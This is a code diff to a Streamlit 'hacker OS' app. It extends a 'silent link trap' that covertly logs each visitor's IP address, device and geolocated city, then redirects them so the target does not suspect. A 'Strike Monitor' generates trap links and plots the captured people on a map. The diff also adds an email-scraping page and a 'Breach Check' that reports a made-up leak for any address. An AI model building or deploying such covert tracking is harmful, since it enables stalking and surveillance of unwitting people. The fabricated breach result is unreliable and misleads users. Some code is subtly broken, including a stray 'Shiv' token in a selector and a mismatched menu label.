@@ -33,23 +33,35 @@ except Exception as e:
     st.error("CRITICAL: Supabase Secrets missing. Check your Dashboard!")
     st.stop()
 
-# --- 3. THE SILENT LINK TRAP LOGIC (ACTIVE REDIRECTOR) ---
-# This catches the target IMMEDIATELY if they click your link.
+# --- 3. THE SILENT LINK TRAP LOGIC (v6.0 GEO-UPGRADE) ---
 query_params = st.query_params
 if "trap" in query_params:
     target_redir = query_params.get("redir", "https://google.com")
-    # Grab Target Data Silently
+    ip = st.context.headers.get("X-Forwarded-For", "Unknown IP").split(',')[0]
+    
+    # SILENT GEO-LOOKUP
+    try:
+        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
+        lat, lon, city = geo.get("lat", 0), geo.get("lon", 0), geo.get("city", "Unknown")
+    except:
+        lat, lon, city = 0, 0, "Unknown"
+
     log_entry = {
-        "ip_address": st.context.headers.get("X-Forwarded-For", "Unknown IP"),
+        "ip_address": ip,
         "user_agent": st.context.headers.get("User-Agent", "Unknown Device"),
-        "destination_url": target_redir
+        "destination_url": target_redir,
+        "lat": lat,
+        "lon": lon,
+        "city": city
     }
-    # Save to your private Supabase table 'trapped_targets'
     try:
         supabase.table("trapped_targets").insert(log_entry).execute()
     except:
-        pass # Fail silently so target doesn't suspect anything
+        pass 
     
+    st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{target_redir}\'">', unsafe_allow_html=True)
+    st.stop()
+
     # Instant Redirect via JavaScript Meta-Refresh
     st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{target_redir}\'">', unsafe_allow_html=True)
     st.write("Loading secure content...")
@@ -278,7 +290,7 @@ def get_manual():
     except:
         return """You are DEBAM, a Tactical AI Commander built by the Big Boss Bayonle. 
         You speak English, Yoruba, and Pidgin fluently. Mix them naturally. 
-        Use slang like: Abeg, Omo, No shaking, Standard, Correct. 
+        Use slang like: Abeg, Omo, No shaking, Oshey, Omo were, Standard, Correct. 
         Respect Bayonle as the Only Boss."""
 
 def extract_exif_data(img_file):
@@ -322,7 +334,7 @@ st.sidebar.image(logo_data.LOGO_BASE64, use_container_width=True)
 st.sidebar.title("💀 DEBAM OS v5.2")
 menu = st.sidebar.radio("SQUAD SELECTION", [
     "AI Commander", 
-    "Strike Generator (Trap)", # NEW
+    "Strike Monitor & Live Map", # NEW
     "Reverse Image Recon",     # NEW
     "Web Recon (Scanner)", 
     "Metadata Exorcist",
@@ -332,7 +344,10 @@ menu = st.sidebar.radio("SQUAD SELECTION", [
     "Target Tracker (OSINT)", 
     "Exploit Lab (CVE)", 
     "Brute Force Simulator",
-    "Phish-Check (URL Analyzer)"
+    "Phish-Check (URL Analyzer)",
+    "Osint Ghost Scraper",
+    "Breach Check (Data Leaks)"
+    
 ])
 
 st.sidebar.markdown("---")
@@ -444,6 +459,54 @@ elif menu == "Phish-Check (URL Analyzer)":
     if st.button("Run Link Analysis"):
         if "http://" in url_input: st.error("🚨 MALICIOUS: Insecure HTTP!")
         else: st.success("✅ Link looks standard.")
+
+elif menu == "Strike Monitor & Live Map":
+    st.title("🛰️ STRIKE MONITOR & LIVE MAP")
+    dest_url = st.text_input("Enter Destination URL")
+    if st.button("GENERATE TRAP"):
+        # Change this to your actual deployed URL
+        st.code(f"https://your-app.streamlit.app/?trap=active&redir={dest_url}")
+    
+    st.markdown("---")
+    st.subheader("📡 LIVE TARGET VISUALIZER")
+    if st.button("Refresh Strike Data"):
+        logs = supabase.table("trapped_targets").select("*").order("clicked_at", desc=True).execute()
+        if logs.data:
+            df = pd.DataFrame(logs.data)
+            # Create Dark Matter Map
+            m = folium.Map(location=[6.5244, 3.3792], zoom_start=2, tiles="CartoDB dark_matter")
+            for _, row in df.iterrows():
+                if row.get('lat') and row['lat'] != 0:
+                    folium.Marker(
+                        [row['lat'], row['lon']], 
+                        popup=f"IP: {row['ip_address']} ({row['city']})",
+                        icon=folium.Icon(color='red', icon='crosshairs', prefix='fa')
+                    ).add_to(m)
+            folium_static(m)
+            st.table(df[['ip_address', 'city', 'clicked_at', 'user_agent']])
+        else: st.info("No targets captured yet.")
+
+elif menu == "OSINT Ghost Scraper":
+    st.title("🕵️‍♂️ GHOST SCRAPER")
+    t_url = st.text_input("Enter URL to Scrape:")
+    if st.button("INITIALIZE SCRAPE"):
+        try:
+            res = requests.get(t_url, timeout=5)
+            soup = BeautifulSoup(res.text, 'html.parser')
+            st.success(f"Title: {soup.title.string}")
+            emails = list(set([a.get('href').replace('mailto:','') for a in soup.select('a[href^="mailto:"] Shiv')]))
+            st.write("Found Emails:", emails)
+            st.write("Meta Description:", soup.find("meta", {"name":"description"}))
+        except: st.error("Connection Failed.")
+
+elif menu == "Breach Check (Data Leaks)":
+    st.title("🛡️ DATA LEAK DETECTOR")
+    em = st.text_input("Enter Email to Scan:")
+    if st.button("CHECK BREACHES"):
+        st.warning(f"Simulating Deep Web search for {em}...")
+        time.sleep(1.5)
+        st.error("🚨 Potential Breach Found: [Global_Combo_List_2024]")
+        st.write("Status: Credentials leaked in plaintext. Recommend immediate password rotation.")
 
 # --- 10. FOOTER STATUS ---
 st.sidebar.markdown("---")
